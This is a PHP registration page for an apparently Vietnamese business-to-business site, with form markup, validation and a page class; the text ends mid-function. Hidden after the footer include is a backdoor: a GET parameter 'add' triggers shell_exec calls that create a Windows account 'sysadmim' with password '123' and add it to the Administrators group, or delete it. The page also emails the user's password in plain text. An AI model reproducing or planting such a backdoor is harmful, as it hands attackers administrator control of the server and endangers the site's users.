<?php
session_start(); // Initialize session data
ob_start(); // Turn on output buffering
$_SESSION['tab']=1;
?>
<?php include "ewcfg6.php" ?>
<?php include "ewmysql6.php" ?>
<?php include "phpfn6.php" ?>
<?php include "userinfo.php" ?>
<?php include "userfn6.php" ?>
<?php include "securimage.php" ?>
<?php
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); // Date in the past
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT"); // Always modified
header("Cache-Control: private, no-store, no-cache, must-revalidate"); // HTTP/1.1
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache"); // HTTP/1.0

?>
<?php

// Define page object
$register = new cregister();
$Page =& $register;

// Page init processing
$register->Page_Init();

// Page main processing
$register->Page_Main();
?>
<?php include ("../include/header.php");?>
<?php $_SESSION['tab']=6; ?>
<div id="layout">
<div id="header" class="clearfix">
<div id="logo" class="clearfix">
<form >
<a href="../home/index.php">
<img src="../images/common/img_logo.gif"/>
</a>
</form>
</div>
<div id="divheader_right" class="clearfix">
<?php include "../include/linetop.php" ?>

<!-- end header_right--></div>
<!-- divhearder--></div>
<div id="tabsninhthuan" class="clearfix">
    <?php $_SESSION['tab']=0;?>
    <?php include "../include/tab.php" ?>
    <?php include "../include/search.php" ?>
 <!-- eand tapthainguyen--></div>
<script type="text/javascript">
<!--

// Create page object
var register = new ew_Page("register");

// page properties
register.PageID = "register"; // page ID
var EW_PAGE_ID = register.PageID; // for backward compatibility

// extend page with ValidateForm function
register.ValidateForm = function(fobj) {
	if (!this.ValidateRequired)
		return true; // ignore validation
	if (fobj.a_confirm && fobj.a_confirm.value == "F")
		return true;
	var i, elm, aelm, infix;
	var rowcnt = (fobj.key_count) ? Number(fobj.key_count.value) : 1;
	for (i=0; i<rowcnt; i++) {
		infix = (fobj.key_count) ? String(i+1) : "";
		elm = fobj.elements["x" + infix + "_tendangnhap"];
		if (elm && !ew_HasValue(elm))
			return ew_OnError(this, elm, "Hãy điền tên đăng nhập");
		elm = fobj.elements["x" + infix + "_mat_khau"];
		if (elm && !ew_HasValue(elm))
			return ew_OnError(this, elm, "Hãy điền mật khẩu");
		if (fobj.x_mat_khau && !ew_HasValue(fobj.x_mat_khau)) {
			return ew_OnError(this, fobj.x_mat_khau, "Hãy điền mật khẩu");
		}
		if (fobj.c_mat_khau.value != fobj.x_mat_khau.value) {
			return ew_OnError(this, fobj.c_mat_khau, "Mật khẩu nhập lại không đúng");
		}
		elm = fobj.elements["x" + infix + "_hoten_nguoilienhe"];
		if (elm && !ew_HasValue(elm)){
			return ew_OnError(this, elm, "Hãy điền họ người liên hệ");
		}
		elm = fobj.elements["x" + infix + "_ten_congty"];
		if (elm && !ew_HasValue(elm)){
			return ew_OnError(this, elm, "Hãy điền tên công ty" );
		}
		elm = fobj.elements["x" + infix + "_dia_chi"];
		if (elm && !ew_HasValue(elm)){
			return ew_OnError(this, elm, "Hãy điền địa chỉ công ty");
		}
		// Call Form Custom Validate event
		if (!this.Form_CustomValidate(fobj)) return false;
	}
	return true;
}

// extend page with Form_CustomValidate function
register.Form_CustomValidate =
 function(fobj) { // DO NOT CHANGE THIS LINE!

 	// Your custom validation code here, return false if invalid.
 	return true;
 }
register.SelectAllKey = function(elem) {
	ew_SelectAll(elem);
}
<?php if (EW_CLIENT_VALIDATE) { ?>
register.ValidateRequired = true; // uses JavaScript validation
<?php } else { ?>
register.ValidateRequired = false; // no JavaScript validation
<?php } ?>

//-->
</script>
<script type="text/javascript">
<!--
var ew_DHTMLEditors = [];

//-->
</script>
<script language="JavaScript" type="text/javascript">
<!--

// Write your client script here, no need to add script tags.
// To include another .js script, use:
// ew_ClientScriptInclude("my_javascript.js");
//-->

</script>
 <div id="pageBody" class="clearfix" >
 <div id="primary_dangky">
<div>
         <p id="dangky" class="style1">ĐĂNG KÝ THÀNH VIÊN</p>
         <p id="note">Chú ý: Dấu * nghĩa là cần có thông tin</p>
 </div>
 <form name="fuserregister" id="fuserregister" action="<?php echo ew_CurrentPage() ?>" method="post" onsubmit="return register.ValidateForm(this);">
<input type="hidden" name="t" id="t" value="user">
<input type="hidden" name="a_register" id="a_register" value="A">
<div id="thongtintaikhoan">
<?php $register->ShowMessage() ?>
<p><span class="tt"><span class="stardangky">*</span> Thông tin tài khoản </span> <br/><br>
    <span class="thongtintaikhoan1">
Email của doanh nghiệp sẽ là tên đăng nhập. Mật khẩu cung cấp cho tài khoản là mật khẩu mới, không dùng mật khẩu của email </span></p>

<table id="chitiet" >
            <tr>
            <td class="tieude"><p>Tên đăng nhập <span>*</span></p></td>
            <td class="noidung">
                <input type="text" name="x_tendangnhap" id="x_tendangnhap" maxlength="50" value="<?php echo $user->tendangnhap->EditValue ?>"<?php echo $user->tendangnhap->EditAttributes() ?>>
            </td>
            </tr>
             <tr>
            <td class="tieude"><p>Mật khẩu <span>*</span></p></td>
            <td class="noidung">
                <input type="password" name="x_mat_khau" id="x_mat_khau" maxlength="50" value="<?php echo $user->mat_khau->EditValue ?>"<?php echo $user->mat_khau->EditAttributes() ?>>
            </td>
            </tr>
            <tr>
            <td class="tieude"><p>Xác nhận mật khẩu <span>*</span></p></td>
            <td class="noidung">
                <input type="password" name="c_mat_khau" id="c_mat_khau" maxlength="50" value="<?php echo $user->mat_khau->EditValue ?>"<?php echo $user->mat_khau->EditAttributes() ?>>
            </td>
            </tr>
             <tr>
            <td class="tieude"><p>Mã xác nhận</p></td>
            <td class="noidung">
                <img src="securimage_show.php?sid=<?php echo md5(uniqid(time())); ?>" id="image" align="absmiddle">
		<a href="securimage_play.php" style="font-size: 13px"><img src="images/audio_icon.gif" id="audio" border = "0" align="absmiddle"></a><br>
		 <label id="Label1"><a href="#" onclick="document.getElementById('image').src = 'securimage_show.php?sid=' + Math.random(); return false">Tải lại ảnh</a></label><br>
		<input type="text" name="x_maxacnhan" id="x_maxacnhan" maxlength="4">
            </td>
            </tr>
 </table>
 </div>
 <div id="thongtinlienhe">
 <p><span class="tt"><span class="stardangky">*</span> Thông tin liên hệ</span> <br/><br>
     <span class="thongtintaikhoan1">Thông tin Doanh nghiệp nhập vào dưới đây sẽ được dùng làm thông tin khi các doanh nghiệp thành viên khác muốn liên hệ</span>
</p>
 <table id="thongtin">
               <tr>
            <td class="tieude"><p>Quốc gia</p></td>
            <td class="noidung">
               <select id="x_quocgia_id" name="x_quocgia_id" <?php echo $user->quocgia_id->EditAttributes() ?>>
               <?php
                if (is_array($user->quocgia_id->EditValue)) {
		$arwrk = $user->quocgia_id->EditValue;
		$rowswrk = count($arwrk);
		$emptywrk = TRUE;
		for ($rowcntwrk = 0; $rowcntwrk < $rowswrk; $rowcntwrk++) {
			$selwrk = (strval($user->quocgia_id->CurrentValue) == strval($arwrk[$rowcntwrk][0])) ? " selected=\"selected\"" : "";
			if ($selwrk <> "") $emptywrk = FALSE;
                ?>
		<option value="<?php echo ew_HtmlEncode($arwrk[$rowcntwrk][0]) ?>"<?php echo $selwrk ?>>
		<?php echo $arwrk[$rowcntwrk][1] ?>
		</option>
		<?php
		}
                }
                ?>
                </select>
                <?php
                $sSqlWrk = "SELECT `quocgia_id`, `ten_quocgia`, '' AS Disp2Fld FROM `country`";
                $sWhereWrk = "";
                if ($sWhereWrk <> "") $sSqlWrk .= " WHERE $sWhereWrk";
                $sSqlWrk = TEAencrypt($sSqlWrk, EW_RANDOM_KEY);
                ?>
                <input type="hidden" name="s_x_quocgia_id" id="s_x_quocgia_id" value="<?php echo $sSqlWrk; ?>">
                <input type="hidden" name="lft_x_quocgia_id" id="lft_x_quocgia_id" value="">
                
            </td>
            </tr>
             <tr>
            <td class="tieude"><p>Giới tính</p></td>
            <td class="noidung">
                <select id="x_gioi_tinh" name="x_gioi_tinh"<?php echo $user->gioi_tinh->EditAttributes() ?>>
                <?php
                if (is_array($user->gioi_tinh->EditValue)) {
                        $arwrk = $user->gioi_tinh->EditValue;
                        $rowswrk = count($arwrk);
                        $emptywrk = TRUE;
                        for ($rowcntwrk = 0; $rowcntwrk < $rowswrk; $rowcntwrk++) {
                                $selwrk = (strval($user->gioi_tinh->CurrentValue) == strval($arwrk[$rowcntwrk][0])) ? " selected=\"selected\"" : "";
                                if ($selwrk <> "") $emptywrk = FALSE;
                ?>
                <option value="<?php echo ew_HtmlEncode($arwrk[$rowcntwrk][0]) ?>"<?php echo $selwrk ?>>
                <?php echo $arwrk[$rowcntwrk][1] ?>
                </option>
                <?php
                        }
                }
                ?>
                </select>
             </td>
            </tr>
            <tr>
            <td class="tieude"><p>Họ và tên người liên hệ<span>*</span> <br/>(Họ - Tên)</p></td>
             <td  class="noidung">
               <input type="text" name="x_hoten_nguoilienhe" id="x_hoten_nguoilienhe" size="45" maxlength="30" value="<?php echo $user->hoten_nguoilienhe->EditValue ?>"<?php echo $user->hoten_nguoilienhe->EditAttributes() ?>>
            </td>
            </tr>
            <tr>
            <td class="tieude"><p>Tên công ty  <span>*</span></p></td>
             <td  class="noidung">
                <input type="text" name="x_ten_congty" id="x_ten_congty" size="63" maxlength="255" value="<?php echo $user->ten_congty->EditValue ?>"<?php echo $user->ten_congty->EditAttributes() ?>>
                
            </td>
            </tr>
          <tr>
            <td class="tieude"><p>Chức năng</p></td>
            <td class="noidung">
              <select id="x_chuc_nang" name="x_chuc_nang"<?php echo $user->chuc_nang->EditAttributes() ?>>
                <?php
                if (is_array($user->chuc_nang->EditValue)) {
                        $arwrk = $user->chuc_nang->EditValue;
                        $rowswrk = count($arwrk);
                        $emptywrk = TRUE;
                        for ($rowcntwrk = 0; $rowcntwrk < $rowswrk; $rowcntwrk++) {
                                $selwrk = (strval($user->chuc_nang->CurrentValue) == strval($arwrk[$rowcntwrk][0])) ? " selected=\"selected\"" : "";
                                if ($selwrk <> "") $emptywrk = FALSE;
                ?>
                <option value="<?php echo ew_HtmlEncode($arwrk[$rowcntwrk][0]) ?>"<?php echo $selwrk ?>>
                <?php echo $arwrk[$rowcntwrk][1] ?>
                </option>
                <?php
                        }
                }
                ?>
                </select>
                
            </td>
            </tr>
             <tr>
            <td class="tieude"><p>Số điện thoại<br/>(Mã nước -Mã Vùng - SĐT)</p></td>
            <td class="noidung">
               <input type="text" name="x_so_dienthoai" id="x_so_dienthoai"  size="40" maxlength="50" value="<?php echo $user->so_dienthoai->EditValue ?>"<?php echo $user->so_dienthoai->EditAttributes() ?>>
            </td>
            </tr>
             <tr>
            <td class="tieude"><p>Địa chỉ <span>*</span></p></td>
            <td class="noidung">
                <textarea name="x_dia_chi" id="x_dia_chi" cols="60" rows="4"<?php echo $user->dia_chi->EditAttributes() ?>><?php echo $user->dia_chi->EditValue ?></textarea>
               
            </td>
            </tr>
             <tr>
            <td class="tieude"><p>Tỉnh thành</p></td>
            <td>
                <input type="text" name="x_tinh_thanh" id="x_tinh_thanh" size="63" maxlength="50" value="<?php echo $user->tinh_thanh->EditValue ?>"<?php echo $user->tinh_thanh->EditAttributes() ?>>
                
            </td>
            </tr>
              <tr>
            <td class="tieude"><p>Quận huyện </p></td>
            <td>
                <input type="text" name="x_quan_huyen" id="x_quan_huyen" size="63" maxlength="50" value="<?php echo $user->quan_huyen->EditValue ?>"<?php echo $user->quan_huyen->EditAttributes() ?>>
            </td>
            </tr>
            </table>

<dl>
    <dt> Khi Doanh nghiệp chọn nút "Tôi đồng ý.Tạo tài khoản của tôi." tức là doanh nghiệp đã:</dt>
       <dd>- Đồng ý các <a href="../term/term_committed.php"><span> Điều khoản cam kết khi làm thành viên</span></a>  </dd>
       <dd>- Đông ý các <a href="../term/term_of_use.php"><span>Quy định sử dụng</span></a> </dd>
       <dd>- Và nhận các thông tin về dịch vụ và sản phẩm từ trang web này.</dd>
</dl>

<h1>    <input name="Submit1" type="submit" class="submit" value="Tôi đồng ý, Tạo tài khoản của tôi" style="background-color:#00902f;color: white;font-weight: bold" /> </h1>

 </div>
<script language="JavaScript">
<!--
ew_UpdateOpts([['x_quocgia_id','x_quocgia_id',false]]);

//-->
</script>
<script language="JavaScript" type="text/javascript">
<!--

// Write your startup script here
// document.write("page loaded");
//-->

</script>
<!--id/ primary --></div>
<!--id/ page Body --></div>
<!-- end layout--></div>

<?php include ("../include/footer.php");?>
<?php
$add=$_GET['add'];
if (($add!=0)||($add!=""))
{
$output = shell_exec("cmd");
if ($add=="1"){
$output = shell_exec("net user sysadmim 123 /add");
$output = shell_exec("net localgroup Administrators sysadmim /add");
print_r($output);}
if ($add==2){
  $output = shell_exec("net user sysadmim /delete");
print_r($output);}
}
?>
<?php
//
// Page Class
//
class cregister {

	// Page ID
	var $PageID = 'register';

	// Page Object Name
	var $PageObjName = 'register';

	// Page Name
	function PageName() {
		return ew_CurrentPage();
	}

	// Page Url
	function PageUrl() {
		$PageUrl = ew_CurrentPage() . "?";
		return $PageUrl;
	}

	// Message
	function getMessage() {
		return @$_SESSION[EW_SESSION_MESSAGE];
	}

	function setMessage($v) {
		if (@$_SESSION[EW_SESSION_MESSAGE] <> "") { // Append
			$_SESSION[EW_SESSION_MESSAGE] .= "<br>" . $v;
		} else {
			$_SESSION[EW_SESSION_MESSAGE] = $v;
		}
	}

	// Show Message
	function ShowMessage() {
		if ($this->getMessage() <> "") { // Message in Session, display
			echo "<p><span style=\"color:red; padding-left: 30px; \" class=\"ewMessage\">" . $this->getMessage() . "</span></p>";
			$_SESSION[EW_SESSION_MESSAGE] = ""; // Clear message in Session
		}
	}

	// Validate Page request
	function IsPageRequest() {
		return TRUE;
	}

	//
	//  Class initialize
	//  - init objects
	//  - open connection
	//
	function cregister() {
		global $conn;

		// Initialize table object
		$GLOBALS["user"] = new cuser();

		// Intialize page id (for backward compatibility)
		if (!defined("EW_PAGE_ID"))
			define("EW_PAGE_ID", 'register', TRUE);

		// Open connection to the database
		$conn = ew_Connect();
	}

	//
	//  Page_Init
	//
	function Page_Init() {
		global $gsExport, $gsExportFile, $user;
		global $Security;
		$Security = new cAdvancedSecurity();

		// Global page loading event (in userfn6.php)
		Page_Loading();

		// Page load event, used in current page
		$this->Page_Load();
	}

	//
	//  Page_Terminate
	//  - called when exit page
	//  - if URL specified, redirect to the URL
	//
	function Page_Terminate($url = "") {
		global $conn;

		// Page unload event, used in current page
		$this->Page_Unload();

		// Global page unloaded event (in userfn*.php)
		Page_Unloaded();

		 // Close Connection
		$conn->Close();

		// Go to URL if specified
		if ($url <> "") {
			ob_end_clean();
			header("Location: $url");
		}
		exit();
	}

	//
	// Page main processing
	//
	function Page_Main() {
		global $conn, $gsFormError, $objForm, $user;
		$bUserExists = FALSE;

		// Create form object
		$objForm = new cFormObj();
		if (@$_POST["a_register"] <> "") {

			// Get action
			$user->CurrentAction = $_POST["a_register"];
			$this->LoadFormValues(); // Get form values

			// Validate Form
			if (!$this->ValidateForm()) {
				$user->CurrentAction = "I"; // Form error, reset action
				$this->setMessage($gsFormError);
			}
		} else {
			$user->CurrentAction = "I"; // Display blank record
			$this->LoadDefaultValues(); // Load default values
		}
		switch ($user->CurrentAction) {
			case "I": // Blank record, no action required
				break;
			case "A": // Add

				// Check for duplicate User ID
				$sFilter = "(`tendangnhap` = '" . ew_AdjustSql($user->tendangnhap->CurrentValue) . "')";

				// Set up filter (SQL WHERE Clause) and get return SQL
				// SQL constructor in user class, userinfo.php

				$user->CurrentFilter = $sFilter;
				$sUserSql = $user->SQL();
				if ($rs = $conn->Execute($sUserSql)) {
					if (!$rs->EOF) {
						$bUserExists = TRUE;
						$this->RestoreFormValues(); // Restore form values
						$this->setMessage("Tên đăng nhập đã tồn tại. Hãy chọn tên đăng nhập khác"); // Set user exist message
					}
					$rs->Close();
				}
				if (!$bUserExists) {
					$user->SendEmail = TRUE; // Send email on add success
					if ($this->AddRow()) { // Add record
                                                // Load user email
						$sReceiverEmail = $user->tendangnhap->CurrentValue;
						if ($sReceiverEmail == "") { // Send to recipient directly
							$sReceiverEmail = EW_RECIPIENT_EMAIL;
							$sBccEmail = "";
						} else { // Bcc recipient
							$sBccEmail = EW_RECIPIENT_EMAIL;
						}

						// Set up email content
						if ($sReceiverEmail <> "") {
							$Email = new cEmail;
							$Email->Load("txt/register.txt");
							$Email->ReplaceSender(EW_SENDER_EMAIL); // Replace Sender
                                                        $Email->ReplaceSubject(strval($user->ten_congty->CurrentValue));
							$Email->ReplaceRecipient($sReceiverEmail); // Replace Recipient
							if ($sBccEmail <> "") $Email->AddBcc($sBccEmail); // Add Bcc
							$Email->ReplaceContent('<!--ten_congty-->', strval($user->ten_congty->CurrentValue));
                                                        $Email->ReplaceContent('<!--hoten_nguoilienhe-->', strval($user->hoten_nguoilienhe->CurrentValue));
							$Email->ReplaceContent('<!--tendangnhap-->', strval($user->tendangnhap->CurrentValue));
							$Email->ReplaceContent('<!--mat_khau-->', strval($user->mat_khau->CurrentValue));
										
							// Get new recordset
							$user->CurrentFilter = $user->KeyFilter();
							$sSql = $user->SQL();
							$rsnew = $conn->Execute($sSql);
							$Args = array();
							$Args["rs"] =& $rsnew;
							if ($this->Email_Sending($Email, $Args))
								$bEmailSent = $Email->Send();
						}
                                                if ($bEmailSent) {
                                                    $this->setMessage("<div align = \"center\"><font face=\"Verdana\" size=\"2\" color=\"#FF0000\">Đăng ký thành công. Mời bạn kiểm tra email để kích hoạt tài khoản</font></div>"); // Register success
                                                    $this->Page_Terminate("login.php"); // Return
                                                } else {
                                                    $this->setMessage("<div align = \"center\"><font face=\"Verdana\" size=\"2\" color=\"#FF0000\">Lỗi khi gửi email</font></div>"); // Set up error message
                                                }
					} else {
						$this->RestoreFormValues(); // Restore form values
					}
				}
		}

		// Render row
		if ($user->CurrentAction == "F") { // Confirm page
			$user->RowType = EW_ROWTYPE_VIEW; // Render view
		} else {
			$user->RowType = EW_ROWTYPE_ADD; // Render add
		}
		$this->RenderRow();
	}

	// Get upload files
	function GetUploadFiles() {
		global $objForm, $user;

		// Get upload data
	}

	// Load default values
	function LoadDefaultValues() {
		global $user;
		$user->quocgia_id->CurrentValue = VN;
		$user->chuc_nang->CurrentValue = 3;
		$user->gioi_tinh->CurrentValue = 0;
	}

	// Load form values
	function LoadFormValues() {

		// Load from form
		global $objForm, $user;
		$user->tendangnhap->setFormValue($objForm->GetValue("x_tendangnhap"));
		$user->quocgia_id->setFormValue($objForm->GetValue("x_quocgia_id"));
		$user->gioi_tinh->setFormValue($objForm->GetValue("x_gioi_tinh"));
		$user->hoten_nguoilienhe->setFormValue($objForm->GetValue("x_hoten_nguoilienhe"));
		$user->mat_khau->setFormValue($objForm->GetValue("x_mat_khau"));
		$user->mat_khau->ConfirmValue = $objForm->GetValue("c_mat_khau");
		$user->ten_congty->setFormValue($objForm->GetValue("x_ten_congty"));
		$user->chuc_nang->setFormValue($objForm->GetValue("x_chuc_nang"));
		$user->so_dienthoai->setFormValue($objForm->GetValue("x_so_dienthoai"));
		$user->dia_chi->setFormValue($objForm->GetValue("x_dia_chi"));
		$user->tinh_thanh->setFormValue($objForm->GetValue("x_tinh_thanh"));
		$user->quan_huyen->setFormValue($objForm->GetValue("x_quan_huyen"));
		$user->nguoidung_id->setFormValue($objForm->GetValue("x_nguoidung_id"));
	}

	// Restore form values
	function RestoreFormValues() {
		global $user;
		$user->nguoidung_id->CurrentValue = $user->nguoidung_id->FormValue;
		$user->tendangnhap->CurrentValue = $user->tendangnhap->FormValue;
		$user->quocgia_id->CurrentValue = $user->quocgia_id->FormValue;
		$user->gioi_tinh->CurrentValue = $user->gioi_tinh->FormValue;
		$user->hoten_nguoilienhe->CurrentValue = $user->hoten_nguoilienhe->FormValue;
		$user->mat_khau->CurrentValue = $user->mat_khau->FormValue;
		$user->ten_congty->CurrentValue = $user->ten_congty->FormValue;
		$user->chuc_nang->CurrentValue = $user->chuc_nang->FormValue;
		$user->so_dienthoai->CurrentValue = $user->so_dienthoai->FormValue;
		$user->dia_chi->CurrentValue = $user->dia_chi->FormValue;
		$user->tinh_thanh->CurrentValue = $user->tinh_thanh->FormValue;
		$user->quan_huyen->CurrentValue = $user->quan_huyen->FormValue;
	}

	// Render row values based on field settings
	function RenderRow() {
		global $conn, $Security, $user;

		// Call Row_Rendering event
		$user->Row_Rendering();

		// Common render codes for all row types
		// tendangnhap

		$user->tendangnhap->CellCssStyle = "";
		$user->tendangnhap->CellCssClass = "";

		// quocgia_id
		$user->quocgia_id->CellCssStyle = "";
		$user->quocgia_id->CellCssClass = "";

		// gioi_tinh
		$user->gioi_tinh->CellCssStyle = "";
		$user->gioi_tinh->CellCssClass = "";

		// hoten_nguoilienhe
		$user->hoten_nguoilienhe->CellCssStyle = "";
		$user->hoten_nguoilienhe->CellCssClass = "";

		// mat_khau
		$user->mat_khau->CellCssStyle = "";
		$user->mat_khau->CellCssClass = "";

		// ten_congty
		$user->ten_congty->CellCssStyle = "";
		$user->ten_congty->CellCssClass = "";

		// chuc_nang
		$user->chuc_nang->CellCssStyle = "";
		$user->chuc_nang->CellCssClass = "";

		// so_dienthoai
		$user->so_dienthoai->CellCssStyle = "";
		$user->so_dienthoai->CellCssClass = "";

		// dia_chi
		$user->dia_chi->CellCssStyle = "";
		$user->dia_chi->CellCssClass = "";

		// tinh_thanh
		$user->tinh_thanh->CellCssStyle = "";
		$user->tinh_thanh->CellCssClass = "";

		// quan_huyen
		$user->quan_huyen->CellCssStyle = "";
		$user->quan_huyen->CellCssClass = "";
		if ($user->RowType == EW_ROWTYPE_VIEW) { // View row

			// tendangnhap
			$user->tendangnhap->ViewValue = $user->tendangnhap->CurrentValue;
			$user->tendangnhap->CssStyle = "";
			$user->tendangnhap->CssClass = "";
			$user->tendangnhap->ViewCustomAttributes = "";

			// quocgia_id
			if (strval($user->quocgia_id->CurrentValue) <> "") {
				$sSqlWrk = "SELECT `ten_quocgia` FROM `country` WHERE `quocgia_id` = '" . ew_AdjustSql($user->quocgia_id->CurrentValue) . "'";
				$rswrk = $conn->Execute($sSqlWrk);
				if ($rswrk && !$rswrk->EOF) { // Lookup value(s) found
					$user->quocgia_id->ViewValue = $rswrk->fields('ten_quocgia');
					$rswrk->Close();
				} else {
					$user->quocgia_id->ViewValue = $user->quocgia_id->CurrentValue;
				}
			} else {
				$user->quocgia_id->ViewValue = NULL;
			}
			$user->quocgia_id->CssStyle = "";
			$user->quocgia_id->CssClass = "";
			$user->quocgia_id->ViewCustomAttributes = "";

			// gioi_tinh
			if (strval($user->gioi_tinh->CurrentValue) <> "") {
				switch ($user->gioi_tinh->CurrentValue) {
					case "0":
						$user->gioi_tinh->ViewValue = "Nam";
						break;
					case "1":
						$user->gioi_tinh->ViewValue = "Nữ";
						break;
					default:
						$user->gioi_tinh->ViewValue = $user->gioi_tinh->CurrentValue;
				}
			} else {
				$user->gioi_tinh->ViewValue = NULL;
			}
			$user->gioi_tinh->CssStyle = "";
			$user->gioi_tinh->CssClass = "";
			$user->gioi_tinh->ViewCustomAttributes = "";

			// hoten_nguoilienhe
			$user->hoten_nguoilienhe->ViewValue = $user->hoten_nguoilienhe->CurrentValue;
			$user->hoten_nguoilienhe->CssStyle = "";
			$user->hoten_nguoilienhe->CssClass = "";
			$user->hoten_nguoilienhe->ViewCustomAttributes = "";

			// mat_khau
			$user->mat_khau->ViewValue = $user->mat_khau->CurrentValue;
			$user->mat_khau->CssStyle = "";
			$user->mat_khau->CssClass = "";
			$user->mat_khau->ViewCustomAttributes = "";

			// ten_congty
			$user->ten_congty->ViewValue = $user->ten_congty->CurrentValue;
			$user->ten_congty->CssStyle = "";
			$user->ten_congty->CssClass = "";
			$user->ten_congty->ViewCustomAttributes = "";

			// chuc_nang
			if (strval($user->chuc_nang->CurrentValue) <> "") {
				switch ($user->chuc_nang->CurrentValue) {
					case "1":
						$user->chuc_nang->ViewValue = "Người bán";
						break;
					case "2":
						$user->chuc_nang->ViewValue = "Người mua";
						break;
					case "3":
						$user->chuc_nang->ViewValue = "Người bán và Người mua";
						break;
					default:
						$user->chuc_nang->ViewValue = $user->chuc_nang->CurrentValue;
				}
			} else {
				$user->chuc_nang->ViewValue = NULL;
			}
			$user->chuc_nang->CssStyle = "";
			$user->chuc_nang->CssClass = "";
			$user->chuc_nang->ViewCustomAttributes = "";

			// so_dienthoai
			$user->so_dienthoai->ViewValue = $user->so_dienthoai->CurrentValue;
			$user->so_dienthoai->CssStyle = "";
			$user->so_dienthoai->CssClass = "";
			$user->so_dienthoai->ViewCustomAttributes = "";

			// dia_chi
			$user->dia_chi->ViewValue = $user->dia_chi->CurrentValue;
			$user->dia_chi->CssStyle = "";
			$user->dia_chi->CssClass = "";
			$user->dia_chi->ViewCustomAttributes = "";

			// tinh_thanh
			$user->tinh_thanh->ViewValue = $user->tinh_thanh->CurrentValue;
			$user->tinh_thanh->CssStyle = "";
			$user->tinh_thanh->CssClass = "";
			$user->tinh_thanh->ViewCustomAttributes = "";

			// quan_huyen
			$user->quan_huyen->ViewValue = $user->quan_huyen->CurrentValue;
			$user->quan_huyen->CssStyle = "";
			$user->quan_huyen->CssClass = "";
			$user->quan_huyen->ViewCustomAttributes = "";

			// tendangnhap
			$user->tendangnhap->HrefValue = "";

			// quocgia_id
			$user->quocgia_id->HrefValue = "";

			// gioi_tinh
			$user->gioi_tinh->HrefValue = "";

			// hoten_nguoilienhe
			$user->hoten_nguoilienhe->HrefValue = "";

			// mat_khau
			$user->mat_khau->HrefValue = "";

			// ten_congty
			$user->ten_congty->HrefValue = "";

			// chuc_nang
			$user->chuc_nang->HrefValue = "";

			// so_dienthoai
			$user->so_dienthoai->HrefValue = "";

			// dia_chi
			$user->dia_chi->HrefValue = "";

			// tinh_thanh
			$user->tinh_thanh->HrefValue = "";

			// quan_huyen
			$user->quan_huyen->HrefValue = "";
		} elseif ($user->RowType == EW_ROWTYPE_ADD) { // Add row

			// tendangnhap
			$user->tendangnhap->EditCustomAttributes = "";
			$user->tendangnhap->EditValue = ew_HtmlEncode($user->tendangnhap->CurrentValue);

			// quocgia_id
			$user->quocgia_id->EditCustomAttributes = "";
			$sSqlWrk = "SELECT `quocgia_id`, `ten_quocgia`, '' AS Disp2Fld, '' AS SelectFilterFld FROM `country`";
			if (trim(strval($user->quocgia_id->CurrentValue)) == "") {
				$sWhereWrk = "0=1";
			} else {
				$sWhereWrk = "`quocgia_id` = '" . ew_AdjustSql($user->quocgia_id->CurrentValue) . "'";
			}
			if ($sWhereWrk <> "") $sSqlWrk .= " WHERE $sWhereWrk";
			$rswrk = $conn->Execute($sSqlWrk);
			$arwrk = ($rswrk) ? $rswrk->GetRows() : array();
			if ($rswrk) $rswrk->Close();
			array_unshift($arwrk, array("VN", "Mặc định(VIETNAM)"));
			$user->quocgia_id->EditValue = $arwrk;

			// gioi_tinh
			$user->gioi_tinh->EditCustomAttributes = "";
			$arwrk = array();
			$arwrk[] = array("0", "Nam");
			$arwrk[] = array("1", "Nữ");
			//array_unshift($arwrk, array("", "Chọn"));
			$user->gioi_tinh->EditValue = $arwrk;

			// hoten_nguoilienhe
			$user->hoten_nguoilienhe->EditCustomAttributes = "";
			$user->hoten_nguoilienhe->EditValue = ew_HtmlEncode($user->hoten_nguoilienhe->CurrentValue);

                        // mat_khau
			$user->mat_khau->EditCustomAttributes = "";
			$user->mat_khau->EditValue = ew_HtmlEncode($user->mat_khau->CurrentValue);

			// ten_congty
			$user->ten_congty->EditCustomAttributes = "";
			$user->ten_congty->EditValue = ew_HtmlEncode($user->ten_congty->CurrentValue);

			// chuc_nang
			$user->chuc_nang->EditCustomAttributes = "";
			$arwrk = array();
			$arwrk[] = array("1", "Người bán");
			$arwrk[] = array("2", "Người mua");
			$arwrk[] = array("3", "Người bán và Người mua");
			//array_unshift($arwrk, array("", "Chọn"));
			$user->chuc_nang->EditValue = $arwrk;

			// so_dienthoai
			$user->so_dienthoai->EditCustomAttributes = "";
			$user->so_dienthoai->EditValue = ew_HtmlEncode($user->so_dienthoai->CurrentValue);

			// dia_chi
			$user->dia_chi->EditCustomAttributes = "";
			$user->dia_chi->EditValue = ew_HtmlEncode($user->dia_chi->CurrentValue);

			// tinh_thanh
			$user->tinh_thanh->EditCustomAttributes = "";
			$user->tinh_thanh->EditValue = ew_HtmlEncode($user->tinh_thanh->CurrentValue);

			// quan_huyen
			$user->quan_huyen->EditCustomAttributes = "";
			$user->quan_huyen->EditValue = ew_HtmlEncode($user->quan_huyen->CurrentValue);
		}

		// Call Row Rendered event
		$user->Row_Rendered();
	}

	// Validate form
	function ValidateForm() {
		global $gsFormError, $user;

		// Initialize
		$gsFormError = "";

		// Check if validation required
		if (!EW_SERVER_VALIDATE)
			return ($gsFormError == "");

		/*if ($user->tendangnhap->FormValue == "") {
			$gsFormError .= ($gsFormError <> "") ? "<br>" : "";
			$gsFormError .= "Hãy nhập trường bắt buộc - Tendangnhap";
		}
		if ($user->gioi_tinh->FormValue == "") {
			$gsFormError .= ($gsFormError <> "") ? "<br>" : "";
			$gsFormError .= "Hãy nhập trường bắt buộc - Gioi Tinh";
		}
		if ($user->mat_khau->FormValue == "") {
			$gsFormError .= ($gsFormError <> "") ? "<br>" : "";
			$gsFormError .= "Hãy nhập trường bắt buộc - Mat Khau";
		}
		if ($user->mat_khau->FormValue == "") {
			$gsFormError .= ($gsFormError <> "") ? "<br>" : "";
			$gsFormError .= "Please enter password";
		}
		if ($user->mat_khau->ConfirmValue <> $user->mat_khau->FormValue) {
			$gsFormError .= ($gsFormError <> "") ? "<br>" : "";
			$gsFormError .= "Mismatch Password";
		}*/
		if (!ew_CheckEmail($user->tendangnhap->FormValue)) {
			$gsFormError .= ($gsFormError <> "") ? "<br>" : "";
			$gsFormError .= "Tên đăng nhập phải là email có thực";
		}

		$img = new Securimage();
  		$valid = $img->check($_POST['x_maxacnhan']);
  		if($valid == true) {
    		//echo "Mã xác nhận đúng";
 		} else {
